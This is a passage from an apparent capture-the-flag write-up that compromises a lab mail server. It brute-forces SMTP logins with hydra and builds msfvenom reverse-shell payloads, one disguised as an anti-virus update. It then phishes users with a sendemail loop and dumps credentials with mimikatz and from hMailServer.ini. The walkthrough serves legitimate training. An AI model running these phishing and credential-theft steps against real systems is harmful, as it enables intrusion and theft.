+</p><p id="19706ab9-239d-8078-b507-ca8892de4c12" class="">There is potentially another easier way we can brute force by generating a wordlist from brownbricks.co using cewl</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8074-9335-e458e8cd123d" class="code"><code class="language-Bash">cewl https://brownbrick.co &gt; pass.txt</code></pre><p id="19706ab9-239d-8081-befa-ee2abd367015" class=""><br/>I also like to generate a lowercase file just in case, and then combine both lists for brute force<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80f2-bfb2-fb6955120de9" class="code"><code class="language-Bash">cewl --lowercase https://brownbrick.co &gt; pass_lower.txt</code></pre><p id="19706ab9-239d-803e-bbf8-e593babbd9d4" class=""><br/>And then combining both<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80a0-ac7c-dffe5b398f20" class="code"><code class="language-Bash">cat pass.txt pass_lower.tcxt &gt; passwords.txt</code></pre><p id="19706ab9-239d-8086-b34c-e5115f80155d" class="">
+</p><p id="19706ab9-239d-804d-b5c6-d6fe8db075de" class="">Now use hydra<br/><br/>hydra -L emails.txt -P passwords.txt 10.10.157.197 smtp<br/></p><figure id="19706ab9-239d-8172-959c-d497bcf7d837" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/y4RBNJQO9E9Mcrnqjecw30zKlsRd6LKmuxEE96sMFFCdxX0wKHd3pFAMNoOvMLCiSFgBcl4LaaI6vx3bJ7BleMjTj0nlB1YaDM_b9UhLlQaqlheegGGktHFq_4uotULy.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/y4RBNJQO9E9Mcrnqjecw30zKlsRd6LKmuxEE96sMFFCdxX0wKHd3pFAMNoOvMLCiSFgBcl4LaaI6vx3bJ7BleMjTj0nlB1YaDM_b9UhLlQaqlheegGGktHFq_4uotULy.png"/></a></figure><p id="19706ab9-239d-81de-a88e-c2f5baa45019" class="">We have a password for one email ID. (rockyou.txt could&#x27;ve also given us this password but it would&#x27;ve taken alot of time.)</p><p id="19706ab9-239d-808b-9e0d-e0f5a20b0730" class="">
+</p><p id="19706ab9-239d-813b-bfea-fbfb033e6a90" class=""><strong><span style="border-bottom:0.05em solid">Phishing:</span></strong></p><p id="19706ab9-239d-819c-9834-ed6abeadf373" class="">As we have an email ID with its password for hMailServer, we can use thunderbird to login and send malicious mails to other users, or we can simply do that using a bash script. But first we need a payload that can give us reverse shell if any user clicks/installs it.<br/>There are various ways to do this, like using a malicious VBA script in a .doc or .xls file or directly generating a reverse shell payload using msfvenom. I would like to try .xls file here for this task just to simulate a realistic phishing attack.<br/>First generate a reverse shell VBA script via msfvenom<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80d9-8042-e53d93239e6f" class="code"><code class="language-Bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.89.229 LPORT=443 -f vba</code></pre><p id="19706ab9-239d-80fd-8b72-c1c59f6099d7" class=""><br/>Copy the generated script into the macro of a new &quot;sales_report.xls&quot; file.<br/>(Again, you don&#x27;t need a meterpreter shell, you can use any windows reverse shell, you will use netcat to listen to in that case.)<br/>If you went with meterpreter shell then start msfconsole and run multi/handler after setting the payload, LHOST and LPORT. If you used non-meterpreter payload then simple start a netcat listener.<br/></p><figure id="19706ab9-239d-81f1-b42a-ea02c8b9bfaa" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/nPODMLaX4g2-4syl_MAK7FjqwotQpCyMgcStKCfqOKLFaYw0Jh6Z8QTGg8d5tPEnA9cyPMkUakXf6qUkoRuCCJuUCGFNU0_BEuSEGmhim8scBZTwCep16lxL6WZ3U-Mr.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/nPODMLaX4g2-4syl_MAK7FjqwotQpCyMgcStKCfqOKLFaYw0Jh6Z8QTGg8d5tPEnA9cyPMkUakXf6qUkoRuCCJuUCGFNU0_BEuSEGmhim8scBZTwCep16lxL6WZ3U-Mr.png"/></a></figure><p id="19706ab9-239d-802b-bc24-d03237e50c9e" class="">
+</p><p id="19706ab9-239d-813a-a4b9-fde95d4a488b" class="">Now to send the mails, we can use bash script:<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80d6-b3ec-edbc4b9716dd" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">for email in $(cat emails.txt); do sendemail -f &quot;lhedvig@brownbrick.co&quot; -t $email -u &quot;Sales Report&quot; -m &quot;Please check the report is correct or needs to be updated.&quot; -a sales_report.xls -s 10.10.157.197:25 -xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;; done</code></pre><p id="19706ab9-239d-8028-af25-fc89b3423718" class=""><br/>Explanation:<br/></p><p id="19706ab9-239d-8088-9989-d38decc4be55" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80a8-8f49-c037a991d7b5" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">for email in $(cat emails.txt); do ... done</code></pre><p id="19706ab9-239d-8040-b390-cc9e79a20cb7" class="">Reads each email address from emails.txt and assigns it to the variable $email. Iterates over each email and executes the sendemail command for it.</p><p id="19706ab9-239d-801f-9309-cba1667ce22d" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80f2-8ba9-c916b1bddba9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sendmail</code></pre><p id="19706ab9-239d-8039-89f0-cb16867c3ce1" class="">A command-line tool used to send emails via SMTP.</p><p id="19706ab9-239d-8008-b39d-c219dc318d2a" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-80da-bf0e-db89aa1f0396" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-f &quot;lhedvig@brownbrick.co&quot;</code></pre><p id="19706ab9-239d-80cd-966c-ee3e9a9db65c" class="">The sender&#x27;s email address</p><p id="19706ab9-239d-8020-ad7c-c78d57779ff4" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8031-ab46-f0b8efe88065" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-t $email</code></pre><p id="19706ab9-239d-809a-bd51-cd526bdd691f" class="">The recipient&#x27;s email address (To field). This changes for each loop iteration.</p><p id="19706ab9-239d-8096-aa5b-d9975dc890ea" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-809b-943f-d93f85e2aa0b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-u &quot;Sales Report&quot;</code></pre><p id="19706ab9-239d-80d7-a1fb-f6b34c68ec98" class="">Subject of mail</p><p id="19706ab9-239d-80c0-8200-d99c3da9a99f" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8024-8916-d4aebe767fc1" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-m &quot;Please check the report is correct or needs to be updated.&quot;</code></pre><p id="19706ab9-239d-8036-98b2-f03419ff44e9" class="">Message inside mail</p><p id="19706ab9-239d-803d-be66-fff81624a784" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8057-81c1-e52e2cc1e696" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-a sales_report.xls</code></pre><p id="19706ab9-239d-80cb-a6dc-e4ad620ba6d6" class="">Our malicious attachment</p><p id="19706ab9-239d-802a-a7c2-e08ca5115d3a" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8004-802a-fda1c7a4f1f3" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-s 10.10.157.197:25</code></pre><p id="19706ab9-239d-80c6-aa6f-c4e64879d9c2" class="">SMTP server</p><p id="19706ab9-239d-8000-8837-e9cefa26f567" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-803b-ad11-de25ca6656ff" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">-xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;;</code></pre><p id="19706ab9-239d-8044-bec5-cd7689080df7" class="">User ID and User Password</p><p id="19706ab9-239d-801b-bff2-c8185effd1cf" class="">
+</p><p id="19706ab9-239d-80ec-943a-fd6973f1fd2b" class="">
+</p><figure id="19706ab9-239d-8182-b1f0-d4f1f7aa8b9c" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/BE-_RvjF8tpMQluhOjp4W4IonjH7kThWf7hlWWH32j8b1mWlFyb4fNIFCVGT72JiP8Zt4cR12cQFXEFMx-sxSHMgkmPyW6eHCrG4_U4jkvHj-icYhZnEd9RD2CrlI8Gg.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/BE-_RvjF8tpMQluhOjp4W4IonjH7kThWf7hlWWH32j8b1mWlFyb4fNIFCVGT72JiP8Zt4cR12cQFXEFMx-sxSHMgkmPyW6eHCrG4_U4jkvHj-icYhZnEd9RD2CrlI8Gg.png"/></a></figure><p id="19706ab9-239d-818b-844b-eab83eef3b7a" class="">But I didn&#x27;t get a shell, so it means VBA macro payload won&#x27;t be executed as macros need to be activated, so we have to try a simpler direct payload.<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-806d-a1d8-e33340f7385f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.89.229 LPORT=443 -f exe -o update.exe</code></pre><p id="19706ab9-239d-809f-a5ba-fcd3822b8fb8" class="">
+</p><figure id="19706ab9-239d-8125-90b3-ccc6027354e1" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/UStucY8E5NDLWQ6ryhKevo06pIR92rV8s-pp0AsVw4KZAxD9up--I5nkcVvQwYXQe-HCLHN6V3cg2chc-LoQWTKcTbJ2rcf9BABO6cGHu0TI6pTqzHS5xTR-FnBKlhPp.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/UStucY8E5NDLWQ6ryhKevo06pIR92rV8s-pp0AsVw4KZAxD9up--I5nkcVvQwYXQe-HCLHN6V3cg2chc-LoQWTKcTbJ2rcf9BABO6cGHu0TI6pTqzHS5xTR-FnBKlhPp.png"/></a></figure><figure id="19706ab9-239d-8140-9f85-d79b82eb726c" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/WTg9KazgxwdsHzks4J-VkFH8waQFQKRpI-4DMcpZlxAqqcY0m9vsRbktwAUUVmzU7MT3jZlIIxO-duJLEl2yWPTlDIY2xh7GjxRGQKNtlCkeBAO-w65eKstnvV8UMcK2.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/WTg9KazgxwdsHzks4J-VkFH8waQFQKRpI-4DMcpZlxAqqcY0m9vsRbktwAUUVmzU7MT3jZlIIxO-duJLEl2yWPTlDIY2xh7GjxRGQKNtlCkeBAO-w65eKstnvV8UMcK2.png"/></a></figure><p id="19706ab9-239d-8088-8a19-d8db16f960fd" class="">
+</p><p id="19706ab9-239d-80d8-adab-d9e7a0107241" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8054-b9a1-e7049b070165" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">for email in $(cat emails.txt); do sendemail -f &quot;lhedvig@brownbrick.co&quot; -t $email -u &quot;Sales Report&quot; -m &quot;Install the latest version of anti-virus to protect your system&quot; -a update.exe -s 10.10.157.197:25 -xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;; done</code></pre><p id="19706ab9-239d-81a3-a6d6-dc7e517d9b56" class=""><br/>And we get a reverse shell as <br/><strong>wrohit</strong></p><figure id="19706ab9-239d-8119-b0d4-fb9b33919a84" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/v5cOVyAoKSOUDlqT4vB9EPtavU9S792wC8aNoDWc-Lya_UZcf5Xhfzboh9DpYLGhuOtqDhiAvtnQbFV9Fp0pRRYq4I5PqyEY_Y3TPBMAWNXV7pCGO0_v8x8mqbcy7Wdq.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/v5cOVyAoKSOUDlqT4vB9EPtavU9S792wC8aNoDWc-Lya_UZcf5Xhfzboh9DpYLGhuOtqDhiAvtnQbFV9Fp0pRRYq4I5PqyEY_Y3TPBMAWNXV7pCGO0_v8x8mqbcy7Wdq.png"/></a></figure><p id="19706ab9-239d-81b1-8dbd-c011ae0b8c16" class="">Now get the user flag by navigating to the desktop</p><figure id="19706ab9-239d-8191-babb-cbee842a35ea" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/2VjgRU5OPIK6Tk8rrHwbwYN9ls0JtL2NSeOkqPWcW9BV4yDNUYklU9vMXdHAmulj9ORFcLhFJF0J1oL5a4EYcdSCFXLxbcxivg8CAZQpwJuy5qmF9Tyg80f9-RFEo2fY.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/2VjgRU5OPIK6Tk8rrHwbwYN9ls0JtL2NSeOkqPWcW9BV4yDNUYklU9vMXdHAmulj9ORFcLhFJF0J1oL5a4EYcdSCFXLxbcxivg8CAZQpwJuy5qmF9Tyg80f9-RFEo2fY.png"/></a></figure><p id="19706ab9-239d-812b-a101-c065dd3eadc1" class="">Lets enumerate some things:</p><figure id="19706ab9-239d-8172-9796-e6795be74d44" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/KHUKYcsWjN4NDsUiK9p2F7SlZSCBQiZqcwduRXlMYG9Fw5W9ISPwJZR23gkqQcQeb6I6P3tbvcyc8POUSuwOpozWsEY6_SR16LpUto7vFDIEtwHONgkj8CwvI5ej6-Cx.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/KHUKYcsWjN4NDsUiK9p2F7SlZSCBQiZqcwduRXlMYG9Fw5W9ISPwJZR23gkqQcQeb6I6P3tbvcyc8POUSuwOpozWsEY6_SR16LpUto7vFDIEtwHONgkj8CwvI5ej6-Cx.png"/></a></figure><p id="19706ab9-239d-81ee-919b-f9b75b5c84f8" class="">So wrohit user is in administrators group, so we don&#x27;t need to do a priv-esc (we will still do it at the end).<br/>Now to answer the second question, we can use Mimikatz get the password.<br/>We already have meterpreter shell so we can just load the kiwi extension of mimikatz. If we had a shell via netcat then we can simply upload mimikatz to the target and get the hash or even clear text password.<br/></p><figure id="19706ab9-239d-81ac-9c43-d52f005bad79" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/eyuBKyZ98Lpmo99VFvMtr0XpVfGd20vm4QuSlQJKix_w6zWqFxsNadTM8pQpe-T0iTQvaYZ1xW9KwlLw9XdQUpO8l8BltYrfX6Mv-9e2pjWNBJZ_wsqqiw3jESuRCc8p.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/eyuBKyZ98Lpmo99VFvMtr0XpVfGd20vm4QuSlQJKix_w6zWqFxsNadTM8pQpe-T0iTQvaYZ1xW9KwlLw9XdQUpO8l8BltYrfX6Mv-9e2pjWNBJZ_wsqqiw3jESuRCc8p.png"/></a></figure><p id="19706ab9-239d-81dd-a977-fd743a8f7da9" class="">But this needed system privileges so kiwi didn&#x27;t give any results, so I uploaded mimikatz to the target.<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19706ab9-239d-8071-b705-fba83ae2826b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sekurlsa::wdigest</code></pre><p id="19706ab9-239d-80ba-a0a8-f8eaffb75c95" class="">
+</p><figure id="19706ab9-239d-81e7-b981-dee33b66dc8a" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/Koxy0V5cY5IXx4pc2WxTnguStTb2_r8b8uRdYOS190MlrxQqvtczjhJUAXG1YDvqnOVKQ58bWv_KyjNMp9Ji4UHmjAdcETvW6WDF5KjGKeg49eZM0G8IpsBaTM23hZjh.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/Koxy0V5cY5IXx4pc2WxTnguStTb2_r8b8uRdYOS190MlrxQqvtczjhJUAXG1YDvqnOVKQ58bWv_KyjNMp9Ji4UHmjAdcETvW6WDF5KjGKeg49eZM0G8IpsBaTM23hZjh.png"/></a></figure><figure id="19706ab9-239d-818f-a072-eaa4e030b2dc" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/of-w-PiWODRp32DPgDkgVfFKjA212WS42tK7zomeS0EpeBFsar0Hb1_BKp9KoacRs0eTN_DsZ30qQHTB4EaqoHL0kClvf4jg5N2eWO-aXY4BTQKU9rxF_LErMZTQh2a4.png"><img style="width:684px" src="https://remnote-user-data.s3.amazonaws.com/of-w-PiWODRp32DPgDkgVfFKjA212WS42tK7zomeS0EpeBFsar0Hb1_BKp9KoacRs0eTN_DsZ30qQHTB4EaqoHL0kClvf4jg5N2eWO-aXY4BTQKU9rxF_LErMZTQh2a4.png"/></a></figure><p id="19706ab9-239d-8107-a4e3-ca71491760f6" class="">We get wrohit&#x27;s password.<br/>Now to answer the final question we have to navigate to<br/>C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini<br/>As this is the file where hMailServer stores the credentials<br/></p><figure id="19706ab9-239d-81c6-92d2-f6b96524ff73" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/xpbWu0p6NxLsXtRSNpIbNcF6dkbtjGfszQ4474KKTQOlEtHLjLsn7vbQslglAH3Ke8_8o0wz13PPqUnEFva-8SB-1iNcRDIxkanF6Dmk5HpalcmXMKrsP1vb7kghwDH8.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/xpbWu0p6NxLsXtRSNpIbNcF6dkbtjGfszQ4474KKTQOlEtHLjLsn7vbQslglAH3Ke8_8o0wz13PPqUnEFva-8SB-1iNcRDIxkanF6Dmk5HpalcmXMKrsP1vb7kghwDH8.png"/></a></figure><p id="19706ab9-239d-81b1-8e62-f6e5e08ca30b" class="">(the official hMailServer website also shares this info but for some reason the website wasn&#x27;t loading so I had to go to chatgpt)<br/>By opening the hMailServer.INI file, type hMailServer.INI and we get the password hash.<br/></p><figure id="19706ab9-239d-81fe-a4e7-e50577cd69ef" class="image"><a href="https://remnote-user-data.s3.amazonaws.com/zJMFe8cQJFz1AefxHDTyrYmVLh213eLdlByvuhdy4m1iGMYZ4keQGFmKXkvFkqEVFBEwTueJKUzB1Xx6dWtP5HfytReRuONeJXQCuGVgmdFVOU2NurAJwGA9zcJUHVLN.png"><img style="width:700px" src="https://remnote-user-data.s3.amazonaws.com/zJMFe8cQJFz1AefxHDTyrYmVLh213eLdlByvuhdy4m1iGMYZ4keQGFmKXkvFkqEVFBEwTueJKUzB1Xx6dWtP5HfytReRuONeJXQCuGVgmdFVOU2NurAJwGA9zcJUHVLN.png"/></a></figure><p id="19706ab9-239d-8182-a4c7-c00d8f9aa173" class="">To crack the password we can simply use crackstation (as this is a CTF and not a real target)</p><figure id="19706ab9-239d-8136-86af-e9549d2790f5" class="image"><a 